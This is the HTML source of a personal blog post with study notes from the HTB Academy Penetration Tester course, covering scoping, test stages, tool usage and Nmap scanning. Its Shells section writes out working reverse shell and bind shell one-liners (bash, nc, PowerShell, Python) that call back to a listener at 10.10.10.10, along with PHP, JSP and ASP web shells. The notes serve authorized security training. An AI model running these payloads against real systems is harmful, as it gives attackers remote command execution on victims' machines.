<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=Content-Security-Policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self'; child-src 'self'; font-src 'self'; form-action 'self'; frame-src 'self'; img-src 'self' data: https://*.google-analytics.com https://*.googletagmanager.com; object-src 'none'; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline' https://*.googletagmanager.com; prefetch-src 'self'; connect-src 'self' https://*.google-analytics.com https://*.analytics.google.com https://*.googletagmanager.com"><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HTB Academy: Penetration Tester | woadey</title>
<meta name=keywords content="htb,hackthebox,acadmey,Pentest"><meta name=description content="Notes on HTB Academy – Penetration Tester"><meta name=author content><link rel=canonical href=https://woadey.xyz/posts/htb/pentester/><link crossorigin=anonymous href=/assets/css/stylesheet.e76b59a14721d0cb564e08439ed17c421e12b5639ca65079070ec645ce8a18ba.css integrity="sha256-52tZoUch0MtWTghDntF8Qh4StWOcplB5Bw7GRc6KGLo=" rel="preload stylesheet" as=style><link rel=icon href=https://woadey.xyz/favicon/pink_trans_bg/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://woadey.xyz/favicon/pink_trans_bg/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://woadey.xyz/favicon/pink_trans_bg/favicon-32x32.png><link rel=apple-touch-icon href=https://woadey.xyz/favicon/white_pink_bg/apple-touch-icon.png><link rel=mask-icon href=https://woadey.xyz/favicon/pink_trans_bg/favicon.ico><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9703667233476494" crossorigin=anonymous></script><script async src="https://www.googletagmanager.com/gtag/js?id=G-EF924K1NXR"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-EF924K1NXR",{anonymize_ip:!1})}</script><meta property="og:title" content="HTB Academy: Penetration Tester"><meta property="og:description" content="Notes on HTB Academy – Penetration Tester"><meta property="og:type" content="article"><meta property="og:url" content="https://woadey.xyz/posts/htb/pentester/"><meta property="og:image" content="https://woadey.xyz/posts/htb/pentester/images/logo.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-12-15T05:47:10-05:00"><meta property="article:modified_time" content="2023-12-15T05:47:10-05:00"><meta property="og:site_name" content="woadey's blog"><meta name=twitter:title content="HTB Academy: Penetration Tester"><meta name=twitter:description content="Notes on HTB Academy – Penetration Tester"><meta name=twitter:site content="@woadey_"><meta name=twitter:card content="summary"><meta name=twitter:image content="https://woadey.xyz/posts/htb/pentester/images/logo.png"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"posts","item":"https://woadey.xyz/posts/"},{"@type":"ListItem","position":2,"name":"HTB Academy: Penetration Tester","item":"https://woadey.xyz/posts/htb/pentester/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HTB Academy: Penetration Tester","name":"HTB Academy: Penetration Tester","description":"Notes on HTB Academy – Penetration Tester","keywords":["htb","hackthebox","acadmey","Pentest"],"articleBody":"Penetration Testing Overview A Penetration Test (Pentest) is an organized, targeted, and authorized attack attempt to test IT infrastructure and its defenders to determine their susceptibility to IT security vulnerabilities.\nPrecautionary Measures Obtain written consent from the owner or authorized representative of the computer or network being tested Conduct the testing within the scope of the consent obtained only and respect any limitations specified Take measures to prevent causing damage to the systems or networks being tested Do not access, use or disclose personal data or any other information obtained during the testing without permission Do not intercept electronic communications without the consent of one of the parties to the communication Do not conduct testing on systems or networks that are covered by the Health Insurance Portability and Accountability Act (HIPAA) without proper authorization Pre-Engagement Documents Document Timing for Creation 1. Non-Disclosure Agreement (NDA) After Initial Contact 2. Scoping Questionnaire Before the Pre-Engagement Meeting 3. Scoping Document During the Pre-Engagement Meeting 4. Penetration Testing Proposal (Contract/Scope of Work (SoW)) During the Pre-engagement Meeting 5. Rules of Engagement (RoE) Before the Kick-Off Meeting 6. Contractors Agreement (Physical Assessments) Before the Kick-Off Meeting 7. Reports During and after the conducted Penetration Test Critical Scoping Questions How many expected live hosts? How many IPs/CIDR ranges in scope? How many Domains/Subdomains are in scope? How many wireless SSIDs in scope? How many web/mobile applications? If testing is authenticated, how many roles (standard user, admin, etc.)? For a phishing assessment, how many users will be targeted? Will the client provide a list, or we will be required to gather this list via OSINT? If the client is requesting a Physical Assessment, how many locations? If multiple sites are in-scope, are they geographically dispersed? What is the objective of the Red Team Assessment? Are any activities (such as phishing or physical security attacks) out of scope? Is a separate Active Directory Security Assessment desired? Will network testing be conducted from an anonymous user on the network or a standard domain user? Do we need to bypass Network Access Control (NAC)? Types of Penetration Testing Type Information Provided Blackbox Minimal. Only the essential information, such as IP addresses and domains, is provided. Greybox Extended. In this case, we are provided with additional information, such as specific URLs, hostnames, subnets, and similar. Whitebox Maximum. Here everything is disclosed to us. This gives us an internal view of the entire structure, which allows us to prepare an attack using internal information. We may be given detailed configurations, admin credentials, web application source code, etc. Red-Teaming May include physical testing and social engineering, among other things. Can be combined with any of the above types. Purple-Teaming It can be combined with any of the above types. However, it focuses on working closely with the defenders. Penetration Testing Stages Stage Description 1. Pre-Engagement The first step is to create all the necessary documents in the pre-engagement phase, discuss the assessment objectives, and clarify any questions. 2. Information Gathering Once the pre-engagement activities are complete, we investigate the company’s existing website we have been assigned to assess. We identify the technologies in use and learn how the web application functions. 3. Vulnerability Assessment With this information, we can look for known vulnerabilities and investigate questionable features that may allow for unintended actions. 4. Exploitation Once we have found potential vulnerabilities, we prepare our exploit code, tools, and environment and test the webserver for these potential vulnerabilities. 5. Post-Exploitation Once we have successfully exploited the target, we jump into information gathering and examine the webserver from the inside. If we find sensitive information during this stage, we try to escalate our privileges (depending on the system and configurations). 6. Lateral Movement If other servers and hosts in the internal network are in scope, we then try to move through the network and access other hosts and servers using the information we have gathered. 7. Proof-of-Concept We create a proof-of-concept that proves that these vulnerabilities exist and potentially even automate the individual steps that trigger these vulnerabilities. 8. Post-Engagement Finally, the documentation is completed and presented to our client as a formal report deliverable. Afterward, we may hold a report walkthrough meeting to clarify anything about our testing or results and provide any needed support to personnel tasked with remediating our findings. Vulnerability Analysis Types Analysis Type Description Descriptive Descriptive analysis is essential in any data analysis. On the one hand, it describes a data set based on individual characteristics. It helps to detect possible errors in data collection or outliers in the data set. Diagnostic Diagnostic analysis clarifies conditions’ causes, effects, and interactions. Doing so provides insights that are obtained through correlations and interpretation. We must take a backward-looking view, similar to descriptive analysis, with the subtle difference that we try to find reasons for events and developments. Predictive By evaluating historical and current data, predictive analysis creates a predictive model for future probabilities. Based on the results of descriptive and diagnostic analyses, this method of data analysis makes it possible to identify trends, detect deviations from expected values at an early stage, and predict future occurrences as accurately as possible. Prescriptive Prescriptive analytics aims to narrow down what actions to take to eliminate or prevent a future problem or trigger a specific activity or process. Common Vulnerabilities and Exposures (CVEs) Research CVEdetails Exploit DB Vulners Packet Storm Security NIST Practicing Steps 2x Modules (one technical, one offensive) Read the module Practice the exercises Complete the module Start the module exercises from scratch While solving the exercises again, take notes Create technical documentation based on the notes Create non-technical documentation based on the notes 3x Retired Machines (two easy, one medium) Get the user flag on your own\nGet the root flag on your own\nWrite your technical documentation\nWrite your non-technical documentation\nCompare your notes with the official write-up (or a community write-up if you don’t have a VIP subscription\nCreate a list of information you have missed\nWatch Ippsec’s walkthrough and compare it with your notes\nExpand your notes and documentation by adding the missed parts\n5x Active Machines (two easy, two medium, one hard) Get the user and root flag Write your technical documentation Write your non-technical documentation Have it proofread by technical and non-technical persons 1x Pro Lab / Endgame Complete Link of Completion\nGetting Started CIA triad: “confidentiality, integrity, and availability of data” A hypervisor is software that allows us to create and run virtual machines (VMs). The ISO file is essentially just a CD-ROM that can be mounted within our hypervisor of choice to build the VM by installing the operating system ourselves. An ISO gives us more room for customization, e.g., keyboard layout, locale, desktop environment switch, custom partitioning, etc., and therefore a more granular approach when setting up our attack VM. The OVA file is a pre-built virtual appliance that contains an OVF XML file that specifies the VM hardware settings and a VMDK, which is the virtual disk that the operating system is installed on. An OVA is pre-built and therefore can be rapidly deployed to get up and running quicker. A virtual private network (VPN) allows us to connect to a private (internal) network and access hosts and resources as if we were directly connected to the target private network. It is a secured communications channel over shared public networks to connect to a private network (i.e., an employee remotely connecting to their company’s corporate network from their home). VPNs provide a degree of privacy and security by encrypting communications over the channel to prevent eavesdropping and access to data traversing the channel. netstat -rn will show us the networks accessible via the VPN. Common Ports Port(s) Protocol 20/21 (TCP) FTP 22 (TCP) SSH 23 (TCP) Telnet 25 (TCP) SMTP 80 (TCP) HTTP 161 (TCP/UDP) SNMP 389 (TCP/UDP) LDAP 443 (TCP) SSL/TLS (HTTPS) 445 (TCP) SMB 3389 (TCP) RDP Tools Secure Shell (SSH) is a network protocol that runs on port 22 by default and provides users such as system administrators a secure way to access a computer remotely. Netcat, ncat, or nc, is an excellent network utility for interacting with TCP/UDP ports. There’s another Windows alternative to netcat coded in PowerShell called PowerCat. Another similar network utility is socat, which has a few features that netcat does not support, like forwarding ports and connecting to serial devices. Socat can also be used to upgrade a shell to a fully interactive TTY. Terminal multiplexers, like tmux or Screen, are great utilities for expanding a standard Linux terminal’s features, like having multiple windows within one terminal and jumping between them. Vim is a great text editor that can be used for writing code or editing text files on Linux systems. -nmap for network enumeration and vulnerability scanning. nmap -sV --script=banner -p and nc -nv can be used for Banner Grabbing A tool that can enumerate and interact with SMB shares is smbclient. SNMP Community strings provide information and statistics about a router or device, helping us gain access to it. The manufacturer default community strings of public and private are often unchanged. In SNMP versions 1 and 2c, access is controlled using a plaintext community string, and if we know the name, we can gain access to it. Encryption and authentication were only added in SNMP version 3. Much information can be gained from SNMP. Examination of process parameters might reveal credentials passed on the command line, which might be possible to reuse for other externally accessible services given the prevalence of password reuse in enterprise environments. Routing information, services bound to additional interfaces, and the version of installed software can also be revealed. woadey@htb[/htb]$ snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0 iso.3.6.1.2.1.1.5.0 = STRING: \"gs-svcscan\" woadey@htb[/htb]$ snmpwalk -v 2c -c private 10.129.42.253 Timeout: No Response from 10.129.42.253 A tool such as onesixtyone can be used to brute force the community string names using a dictionary file of common community strings such as the dict.txt file included in the GitHub repo for the tool. woadey@htb[/htb]$ onesixtyone -c dict.txt 10.129.42.254 Scanning 1 hosts, 51 communities 10.129.42.254 [public] Linux gs-svcscan 5.4.0-66-generic #74-Ubuntu SMP Wed Jan 27 22:54:38 UTC 2021 x86_64 We can use a tool such as ffuf or GoBuster to perform this directory enumeration. woadey@htb[/htb]$ gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.10.121/ [+] Threads: 10 [+] Wordlist: /usr/share/dirb/wordlists/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2020/12/11 21:47:25 Starting gobuster =============================================================== /.hta (Status: 403) /.htpasswd (Status: 403) /.htaccess (Status: 403) /index.php (Status: 200) /server-status (Status: 403) /wordpress (Status: 301) =============================================================== 2020/12/11 21:47:46 Finished =============================================================== We can use cURL to retrieve server header information from the command line. cURL can also pull down files. woadey@htb[/htb]$ curl -IL https://www.inlanefreight.com HTTP/1.1 200 OK Date: Fri, 18 Dec 2020 22:24:05 GMT Server: Apache/2.4.29 (Ubuntu) Link: ; rel=\"https://api.w.org/\" Link: ; rel=shortlink Content-Type: text/html; charset=UTF-8 woadey@htb[/htb]$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh 100 144k 100 144k 0 0 176k 0 --:--:-- --:--:-- --:--:-- 176k Another handy tool is EyeWitness, which can be used to take screenshots of target web applications, fingerprint them, and identify possible default credentials. We can extract the version of web servers, supporting frameworks, and applications using the command-line tool whatweb. woadey@htb[/htb]$ whatweb 10.10.10.121 http://10.10.10.121 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[license@php.net], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.121], Title[PHP 7.4.3 - phpinfo()] woadey@htb[/htb]$ whatweb --no-errors 10.10.10.0/24 http://10.10.10.11 [200 OK] Country[RESERVED][ZZ], HTTPServer[nginx/1.14.1], IP[10.10.10.11], PoweredBy[Red,nginx], Title[Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux], nginx[1.14.1] http://10.10.10.100 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.100], Title[File Sharing Service] http://10.10.10.121 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[license@php.net], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.121], Title[PHP 7.4.3 - phpinfo()] http://10.10.10.247 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[contact@cross-fit.htb], Frame, HTML5, HTTPServer[OpenBSD httpd], IP[10.10.10.247], JQuery[3.3.1], PHP[7.4.12], Script, Title[Fine Wines], X-Powered-By[PHP/7.4.12], X-UA-Compatible[ie=edge] One method to transfer files would be using scp, granted we have obtained ssh user credentials on the remote host. woadey@htb[/htb]$ scp linenum.sh user@remotehost:/tmp/linenum.sh user@remotehost's password: ********* linenum.sh In some cases, we may not be able to transfer the file. For example, the remote host may have firewall protections that prevent us from downloading a file from our machine. In this type of situation, we can use a simple trick to base64 encode the file into base64 format, and then we can paste the base64 string on the remote server and decode it. woadey@htb[/htb]$ base64 shell -w 0 f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d \u003e shell Shells A Reverse Shell is the most common type of shell, as it is the quickest and easiest method to obtain control over a compromised host. Payload All The Things has many reverse shell payloads: Linux Victim\nbash -c 'bash -i \u003e\u0026 /dev/tcp/10.10.10.10/1234 0\u003e\u00261' ...or... rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u003e\u00261|nc 10.10.10.10 1234 \u003e/tmp/f Windows Victim\npowershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2\u003e\u00261 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '\u003e ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()\" Another type of shell is a Bind Shell. Unlike a Reverse Shell that connects to us, we will have to connect to it on the targets’ listening port. Once we execute a Bind Shell Command, it will start listening on a port on the remote host and bind that host’s shell, i.e., Bash or PowerShell, to that port. We have to connect to that port with netcat, and we will get control through a shell on that system. Payload All the Things again has payloads for this. Linux Victim\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2\u003e\u00261|nc -lvp 1234 \u003e/tmp/f ...or... python -c 'exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",1234));s1.listen(1);c,a=s1.accept();\\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\"\"\")' Windows Victim\npowershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2\u003e\u00261 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \" \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close(); The final type of shell we have is a Web Shell. A Web Shell is typically a web script, i.e., PHP or ASPX, that accepts our command through HTTP request parameters such as GET or POST request parameters, executes our command, and prints its output back on the web page. php\n\u003c?php system($_REQUEST[\"cmd\"]); ?\u003e jsp\n\u003c% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %\u003e asp\n\u003c% eval request(\"cmd\") %\u003e PrivEsc Checklists Once we gain initial access to a box, we want to thoroughly enumerate the box to find any potential vulnerabilities we can exploit to achieve a higher privilege level. We can find many checklists and cheat sheets online that have a collection of checks we can run and the commands to run these checks. One excellent resource is HackTricks, which has an excellent checklist for both Linux and Windows local privilege escalation. Another excellent repository is PayloadsAllTheThings, which also has checklists for both Linux and Windows. We must start experimenting with various commands and techniques and get familiar with them to understand multiple weaknesses that can lead to escalating our privileges.\nEnumeration Scripts Many of the above commands may be automatically run with a script to go through the report and look for any weaknesses. We can run many scripts to automatically enumerate the server by running common commands that return any interesting findings. Some of the common Linux enumeration scripts include LinEnum and linuxprivchecker, and for Windows include Seatbelt and JAWS.\nAnother useful tool we may use for server enumeration is the Privilege Escalation Awesome Scripts SUITE (PEASS), as it is well maintained to remain up to date and includes scripts for enumerating both Linux and Windows.\nGTFOBins contains a list of commands and how they can be exploited through sudo\nLOLBAS also contains a list of Windows applications which we may be able to leverage to perform certain functions, like downloading files or executing commands in the context of a privileged user.\nPractice Resources Platform Description OWASP Juice Shop Is a modern vulnerable web application written in Node.js, Express, and Angular which showcases the entire OWASP Top Ten along with many other real-world application security flaws. Metasploitable 2 Is a purposefully vulnerable Ubuntu Linux VM that can be used to practice enumeration, automated, and manual exploitation. Metasploitable 3 Is a template for building a vulnerable Windows VM configured with a wide range of vulnerabilities. DVWA This is a vulnerable PHP/MySQL web application showcasing many common web application vulnerabilities with varying degrees of difficulty. IppSec Provides an extremely in-depth walkthrough of every retired HTB box packed full of insight from his own experience, as well as videos on various techniques. VbScrub Provides HTB videos as well as videos on techniques, primarily focusing on Active Directory exploitation. STÖK Provides videos on various infosec related topics, mainly focusing on bug bounties and web application penetration testing. LiveOverflow Provides videos on a wide variety of technical infosec topics. First Attack For an entire write-up of this box, see HTB Writeup: Nibbles.\nComplete Link of Completion\nNetwork Enumeration with Nmap Nmap Architecture Host discovery Port scanning Service enumeration and detection OS detection Scriptable interaction with the target service (Nmap Scripting Engine) TCP-SYN Scan The TCP-SYN scan (-sS) is one of the default settings unless we have defined otherwise and is also one of the most popular scan methods. This scan method makes it possible to scan several thousand ports per second. The TCP-SYN scan sends one packet with the SYN flag and, therefore, never completes the three-way handshake, which results in not establishing a full TCP connection to the scanned port.\nIf our target sends an SYN-ACK flagged packet back to the scanned port, Nmap detects that the port is open. If the packet receives an RST flag, it is an indicator that the port is closed. If Nmap does not receive a packet back, it will display it as filtered. Depending on the firewall configuration, certain packets may be dropped or ignored by the firewall. Scan Network Range woadey@htb[/htb]$ sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d\" \" -f5 10.129.2.4 10.129.2.10 10.129.2.11 10.129.2.18 10.129.2.19 10.129.2.20 10.129.2.28 Scanning Options Description 10.129.2.0/24 Target network range. -sn Disables port scanning. -oA tnet Stores the results in all formats starting with the name ’tnet'. Scan IP List woadey@htb[/htb]$ sudo nmap -sn -oA tnet -iL hosts.lst | grep for | cut -d\" \" -f5 10.129.2.18 10.129.2.19 10.129.2.20 Scanning Options Description -sn Disables port scanning. -oA tnet Stores the results in all formats starting with the name ’tnet'. -iL Performs defined scans against targets in provided ‘hosts.lst’ list. Scan Multiple IPs woadey@htb[/htb]$ sudo nmap -sn -oA tnet 10.129.2.18 10.129.2.19 10.129.2.20| grep for | cut -d\" \" -f5 10.129.2.18 10.129.2.19 10.129.2.20 woadey@htb[/htb]$ sudo nmap -sn -oA tnet 10.129.2.18-20| grep for | cut -d\" \" -f5 10.129.2.18 10.129.2.19 10.129.2.20 Scan Single IP woadey@htb[/htb]$ sudo nmap 10.129.2.18 -sn -oA host Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-14 23:59 CEST Nmap scan report for 10.129.2.18 Host is up (0.087s latency). MAC Address: DE:AD:00:00:BE:EF Nmap done: 1 IP address (1 host up) scanned in 0.11 seconds Scanning Options Description 10.129.2.18 Performs defined scans against the target. -sn Disables port scanning. -oA host Stores the results in all formats starting with the name ‘host’. *If we disable port scan (-sn), Nmap automatically ping scan with ICMP Echo Requests (-PE). Once such a request is sent, we usually expect an ICMP reply if the pinging host is alive. The more interesting fact is that our previous scans did not do that because before Nmap could send an ICMP echo request, it would send an ARP ping resulting in an ARP reply. We can confirm this with the “--packet-trace” option. To ensure that ICMP echo requests are sent, we also define the option (-PE) for this.\nwoadey@htb[/htb]$ sudo nmap 10.129.2.18 -sn -oA host -PE --packet-trace Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 00:08 CEST SENT (0.0074s) ARP who-has 10.129.2.18 tell 10.10.14.2 RCVD (0.0309s) ARP reply 10.129.2.18 is-at DE:AD:00:00:BE:EF Nmap scan report for 10.129.2.18 Host is up (0.023s latency). MAC Address: DE:AD:00:00:BE:EF Nmap done: 1 IP address (1 host up) scanned in 0.05 seconds Scanning Options Description 10.129.2.18 Performs defined scans against the target. -sn Disables port scanning. -oA host Stores the results in all formats starting with the name ‘host’. -PE Performs the ping scan by using ‘ICMP Echo requests’ against the target. --packet-trace Shows all packets sent and received. woadey@htb[/htb]$ sudo nmap 10.129.2.18 -sn -oA host -PE --reason Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 00:10 CEST SENT (0.0074s) ARP who-has 10.129.2.18 tell 10.10.14.2 RCVD (0.0309s) ARP reply 10.129.2.18 is-at DE:AD:00:00:BE:EF Nmap scan report for 10.129.2.18 Host is up, received arp-response (0.028s latency). MAC Address: DE:AD:00:00:BE:EF Nmap done: 1 IP address (1 host up) scanned in 0.03 seconds Scanning Options Description 10.129.2.18 Performs defined scans against the target. -sn Disables port scanning. -oA host Stores the results in all formats starting with the name ‘host’. -PE Performs the ping scan by using ‘ICMP Echo requests’ against the target. --reason Displays the reason for specific result. Nmap Cheatsheet Scanning Options\nNmap Option Description 10.10.10.0/24 Target network range. -sn Disables port scanning. -Pn Disables ICMP Echo Requests -n Disables DNS Resolution. -PE Performs the ping scan by using ICMP Echo Requests against the target. --packet-trace Shows all packets sent and received. --reason Displays the reason for a specific result. --disable-arp-ping Disables ARP Ping Requests. --top-ports= Scans the specified top ports that have been defined as most frequent. -p- Scan all ports. -p22-110 Scan all ports between 22 and 110. -p22,25 Scans only the specified ports 22 and 25. -F Scans top 100 ports. -sS Performs an TCP SYN-Scan. -sA Performs an TCP ACK-Scan. -sU Performs an UDP Scan. -sV Scans the discovered services for their versions. -sC Perform a Script Scan with scripts that are categorized as “default”. --script ","wordCount":"8791","inLanguage":"en","image":"https://woadey.xyz/images/logo.png","datePublished":"2023-12-15T05:47:10-05:00","dateModified":"2023-12-15T05:47:10-05:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://woadey.xyz/posts/htb/pentester/"},"publisher":{"@type":"Organization","name":"woadey","logo":{"@type":"ImageObject","url":"https://woadey.xyz/favicon/pink_trans_bg/favicon.ico"}}}</script></head><body class=dark id=top><script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://woadey.xyz/ accesskey=h title="oadey (Alt + H)"><img src=/images/pink.jpeg srcset="/images/pink_hu5661c188f24668226bb80c6208008ab1_117796_0x32_resize_q75_h2_box.webp 32w, /images/pink_hu5661c188f24668226bb80c6208008ab1_117796_64x0_resize_q75_h2_box.webp 120w" sizes=32px height=32 width=32 alt=logo aria-label=logo>
oadey</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://woadey.xyz/posts/ title=posts><span>posts</span></a></li><li><a href=https://woadey.xyz/categories/ title=categories><span>categories</span></a></li><li><a href=https://woadey.xyz/tags/ title=tags><span>tags</span></a></li><li><a href=https://woadey.xyz/archives/ title=archives><span>archives</span></a></li><li><a href=https://woadey.xyz/search/ title="search (Alt + /)" accesskey=/><span>search</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://woadey.xyz/>home</a>&nbsp;»&nbsp;<a href=https://woadey.xyz/posts/>posts</a></div><h1 class=post-title>HTB Academy: Penetration Tester</h1><div class=post-description>Notes on HTB Academy – <a href=https://academy.hackthebox.com/path/preview/penetration-tester title="Penetration Tester" target=_blank rel="nofollow noopener">Penetration Tester</a></div><div class=post-meta><span title='2023-12-15 05:47:10 -0500 -0500'>December 15, 2023</span>&nbsp;·&nbsp;42 min</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#penetration-testing-overview>Penetration Testing Overview</a><ul><li><a href=#precautionary-measures>Precautionary Measures</a></li><li><a href=#pre-engagement-documents>Pre-Engagement Documents</a></li><li><a href=#critical-scoping-questions>Critical Scoping Questions</a></li><li><a href=#types-of-penetration-testing>Types of Penetration Testing</a></li><li><a href=#penetration-testing-stages>Penetration Testing Stages</a></li><li><a href=#vulnerability-analysis-types>Vulnerability Analysis Types</a></li><li><a href=#common-vulnerabilities-and-exposures-cves-research>Common Vulnerabilities and Exposures (CVEs) Research</a></li><li><a href=#practicing-steps>Practicing Steps</a></li><li><a href=#complete>Complete</a></li></ul></li><li><a href=#getting-started>Getting Started</a><ul><li><a href=#common-ports>Common Ports</a></li><li><a href=#tools>Tools</a></li><li><a href=#shells>Shells</a></li><li><a href=#privesc-checklists>PrivEsc Checklists</a></li><li><a href=#enumeration-scripts>Enumeration Scripts</a></li><li><a href=#practice-resources>Practice Resources</a></li><li><a href=#first-attack>First Attack</a></li><li><a href=#complete-1>Complete</a></li></ul></li><li><a href=#network-enumeration-with-nmap>Network Enumeration with Nmap</a><ul><li><a href=#nmap-architecture>Nmap Architecture</a></li><li><a href=#tcp-syn-scan>TCP-SYN Scan</a></li><li><a href=#scan-network-range>Scan Network Range</a></li><li><a href=#scan-ip-list>Scan IP List</a></li><li><a href=#scan-multiple-ips>Scan Multiple IPs</a></li><li><a href=#scan-single-ip>Scan Single IP</a></li><li><a href=#nmap-cheatsheet>Nmap Cheatsheet</a></li><li><a href=#host-and-port-scanning>Host and Port Scanning</a></li><li><a href=#nmap-scripting-engine-nse>Nmap Scripting Engine (NSE)</a></li><li><a href=#decoys>Decoys</a></li><li><a href=#complete-2>Complete</a></li></ul></li><li><a href=#footprinting>Footprinting</a><ul><li><a href=#enumeration-principles>Enumeration Principles</a></li><li><a href=#enumeration-methodology>Enumeration Methodology</a></li><li><a href=#ftp>FTP</a></li><li><a href=#smb>SMB</a></li><li><a href=#nfs>NFS</a></li><li><a href=#dns>DNS</a></li><li><a href=#imap--pop3>IMAP / POP3</a></li><li><a href=#snmp>SNMP</a></li><li><a href=#mysql>MySQL</a></li><li><a href=#mssql>MSSQL</a></li><li><a href=#ipmi>IPMI</a></li><li><a href=#ssh>SSH</a></li><li><a href=#rsync>Rsync</a></li><li><a href=#r-services>R-Services</a></li><li><a href=#rdp>RDP</a></li><li><a href=#windows-remote-management-winrm>Windows Remote Management (WinRM)</a></li><li><a href=#wmi>WMI</a></li><li><a href=#infrastructure-based-enumeration-cheatsheet>Infrastructure-based Enumeration Cheatsheet</a></li><li><a href=#host-based-enumeration-cheatsheet>Host-based Enumeration Cheatsheet</a></li></ul></li></ul></nav></div></details></div><div class=post-content><h2 id=penetration-testing-overview>Penetration Testing Overview<a hidden class=anchor aria-hidden=true href=#penetration-testing-overview>#</a></h2><p>A Penetration Test (Pentest) is an organized, targeted, and authorized attack attempt to test IT infrastructure and its defenders to determine their susceptibility to IT security vulnerabilities.</p><h3 id=precautionary-measures>Precautionary Measures<a hidden class=anchor aria-hidden=true href=#precautionary-measures>#</a></h3><ul><li>Obtain written consent from the owner or authorized representative of the computer or network being tested</li><li>Conduct the testing within the scope of the consent obtained only and respect any 